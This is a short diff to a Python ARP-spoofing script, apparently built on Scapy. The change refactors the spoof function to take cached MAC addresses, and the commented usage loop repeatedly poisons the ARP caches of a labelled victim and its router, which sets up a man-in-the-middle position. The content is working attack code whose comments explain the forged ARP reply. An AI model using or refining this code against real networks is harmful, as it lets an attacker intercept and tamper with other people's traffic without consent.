@@ -9,8 +9,7 @@ def get_mac(ip):
         return ans[0][1].hwsrc
     return None
 
-def spoof(target_ip, spoof_ip):
-    target_mac = get_mac(target_ip)
+def spoof(target_ip, spoof_ip, target_mac):
     
     # op=2 means "ARP Reply" (is-at)
     # pdst = "Who am I talking to?" (The Victim)
@@ -24,7 +23,9 @@ def spoof(target_ip, spoof_ip):
 # USAGE EXAMPLE in a loop:
 # target_ip = "192.168.1.5" (Victim)
 # gateway_ip = "192.168.1.1" (Router)
+# target_mac = get_mac(target_ip)
+# gateway_mac = get_mac(gateway_ip)
 # while True:
-#     spoof(target_ip, gateway_ip)
-#     spoof(gateway_ip, target_ip)
+#     spoof(target_ip, gateway_ip, target_mac)
+#     spoof(gateway_ip, target_ip, gateway_mac)
 #     time.sleep(2)
